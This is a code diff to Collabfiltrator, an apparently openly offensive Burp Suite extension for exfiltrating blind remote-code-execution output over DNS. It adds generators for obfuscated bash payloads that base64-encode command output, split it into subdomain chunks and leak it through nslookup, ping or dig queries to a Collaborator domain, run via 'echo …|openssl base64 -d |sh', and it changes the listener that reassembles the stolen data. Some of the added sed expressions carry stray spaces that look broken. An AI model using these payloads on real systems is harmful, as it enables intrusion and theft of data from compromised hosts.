@@ -20,15 +20,15 @@ except ImportError:
     pass
     
 
-logging.basicConfig(filename='/tmp/burpCollabfiltrator.log', level=logging.INFO)
+logging.basicConfig(filename='/tmp/burpCollabfiltrator.log', level=logging.INFO, format='%(asctime)s:%(levelname)s:  %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
 
 class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExtenderCallbacks):
     # Extention information
     EXT_NAME = "Collabfiltrator"
     EXT_DESC = "Exfiltrate blind remote code execution output over DNS via Burp Collaborator."
     EXT_AUTHOR = "Adam Logue, Frank Scarpella, Jared McLaren"
-    global burpCollabInstance 
-    global domain
+    #global burpCollabInstance 
+    #global domain
     # Output info to the Extensions console and register Burp API functions
     def registerExtenderCallbacks(self, callbacks):
         print "Name: \t\t"      + BurpExtender.EXT_NAME
@@ -70,9 +70,9 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
 
         
         # Now add content to the first tab's GUI objects
-        self.osComboBox = swing.JComboBox(["Windows", "Linux"])
+        self.osComboBox = swing.JComboBox(["Windows", "Linux_ping", "Linux_nslookup", "Linux_dig"])
         #self.commandTxt = swing.JTextField("ls -lah", 35)
-        self.commandTxt = swing.JTextField("dir C:\inetpub\wwwroot", 35)
+        self.commandTxt = swing.JTextField("dir C:\inetpub\wwwroot", 25)
         self.payloadTxt = swing.JTextArea(10,50)
         self.payloadTxt.setBackground(Color.lightGray)
         self.payloadTxt.setEditable(False)# So you can't messup the generated payload
@@ -144,8 +144,16 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
     def getUiComponent(self):
         return self.tab
 
-    def createBashBase64Payload(self, linuxCommand):
+    def createNslookupBashBase64Payload(self, linuxCommand):
         bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";z=$(for j in $(''' + linuxCommand +''' |base64);do echo $j;done);for j in $(echo $z|sed 's/$/E-F/'|sed -r 's/(.{56})/\\1\\n/g'|sed 's/=/-/g'|sed 's/+/PLUS/g'); do nslookup `printf "%04d" $i`.$j.$d;i=$((i+1));done;'''
+        return "echo " + self._helpers.base64Encode(bashCommand) + "|openssl base64 -d |sh"
+    
+    def createPingBashBase64Payload(self, linuxCommand):
+        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";z=$(for j in $(''' + linuxCommand +''' |base64);do echo $j;done);for j in $(echo $z|sed 's/$/E-F/'|sed -r 's/(.{56})/\\1\\n/g'|sed 's/=/-/g'|sed 's/+/PLUS/g    '); do ping -c 1 `printf "%04d" $i`.$j.$d;i=$((i+1));done;'''
+        return "echo " + self._helpers.base64Encode(bashCommand) + "|openssl base64 -d |sh"
+
+    def createDigBashBase64Payload(self, linuxCommand):
+        bashCommand = '''i=0;d="''' + self.collaboratorDomain + '''";z=$(for j in $(''' + linuxCommand +''' |base64);do echo $j;done);for j in $(echo $z|sed 's/$/E-F/'|sed -r 's/(.{56})/\\1\\n/g'|sed 's/=/-/g'|sed 's/+/PLUS/g        '); do dig `printf "%04d" $i`.$j.$d;i=$((i+1));done;'''
         return "echo " + self._helpers.base64Encode(bashCommand) + "|openssl base64 -d |sh"
 
     
@@ -157,13 +165,19 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
     # return generated payload to payload text area
     def executePayload(self, event):
         self.collaboratorDomain = self.burpCollab.generatePayload(True)#rerun to regenrate new collab domain
-        burpCollabInstance = self.burpCollab
         domain = self.collaboratorDomain # show domain in UI
         self.burpCollaboratorDomainTxt.setText(domain)
+
+        logging.info("Generate CMD: {}".format(self.commandTxt.getText()))
+
         if self.osComboBox.getSelectedItem() == "Windows":
             self.payloadTxt.setText(self.createPowershellBase64Payload(self.commandTxt.getText()))
-        elif self.osComboBox.getSelectedItem() == "Linux":
-            self.payloadTxt.setText(self.createBashBase64Payload(self.commandTxt.getText()))
+        elif self.osComboBox.getSelectedItem() == "Linux_nslookup":
+            self.payloadTxt.setText(self.createNslookupBashBase64Payload(self.commandTxt.getText()))
+        elif self.osComboBox.getSelectedItem() == "Linux_ping":
+            self.payloadTxt.setText(self.createPingBashBase64Payload(self.commandTxt.getText()))
+        elif self.osComboBox.getSelectedItem() == "Linux_dig":
+            self.payloadTxt.setText(self.createDigBashBase64Payload(self.commandTxt.getText()))
         #self.checkCollabDomainStatusWrapper(domain, burpCollabInstance )
         return
 
@@ -186,6 +200,10 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
 
     def stopPollResults(self, event):
         self.pollstop = True
+
+#    def showLogs(self. event):
+#        logfile = "/tmp/burpCollabfiltrator.log"
+        
 
     #monitor collab domain for output response
     def checkCollabDomainStatus(self, domain, objCollab):
@@ -216,31 +234,34 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
                     packet = binascii.a2b_base64(check[i].getProperty('raw_query'))
                     dnsQuery = str(dnslib.DNSRecord.parse(packet).questions[0])
                     dnsQuery = dnsQuery.replace(';','').replace('IN      A','').replace(' ','')
-                    logging.info("raw: %s", dnsQuery)
-                    logging.info("allllll: {}".format(check[i].getProperties()))
+                    #logging.info("raw: %s", dnsQuery)
+                    #logging.info("allllll: {}".format(check[i].getProperties()))
                     
                     r = re.search("^\d\d\d\d\.", dnsQuery)
                     if r:
                         chunk = r.group().replace(".", '')
                         subdomain = re.findall(r"\S+?\.", dnsQuery)[1].replace(".",'')
                         DNSrecordDict[chunk] = subdomain
+                        if subdomain.endswith('-E-F') == True: # ends when meet "-E-F", bugs maybe. 
+                            complete = True
                     
-                    logging.info("recorad: {}".format(DNSrecordDict))
+                    #logging.info("record: {}".format(DNSrecordDict))
                 except Exception as e:
-                    logger.error('Failed to upload to ftp: '+ str(e))
+                    logger.error('Failed: '+ str(e))
             
             ### Check if input stream is done.
             keys = DNSrecordDict.keys()
-            if self.pollstop == True:
-                break
             if keys == oldkeys and keys != []:
                 sameCounter += 1
             elif keys != oldkeys and keys != []:
                 sameCounter = 0
-            if sameCounter == 20:
+                logging.info("record: {}".format(DNSrecordDict))
+            if sameCounter == 30:
                 complete = True
             if loopCount == 61:
                 self.outputTxt.setText("Error: Listener Timeout." + "\n")
+            if self.pollstop == True:
+                break
 
         # End loop, clear the progress bar
         self.progressBar.setVisible(False) # hide progressbar
@@ -250,7 +271,7 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
         logging.info("output: %s", output)
         self.outputTxt.append(output + "\n") #print output to payload box
         self.outputTxt.setCaretPosition(self.outputTxt.getDocument().getLength()) # make sure scrollbar is pointing to bottom
-        self.payloadTxt.setText("") #clear out payload box because listener has stopped     
+        #self.payloadTxt.setText("") #clear out payload box because listener has stopped     
         return
 
 
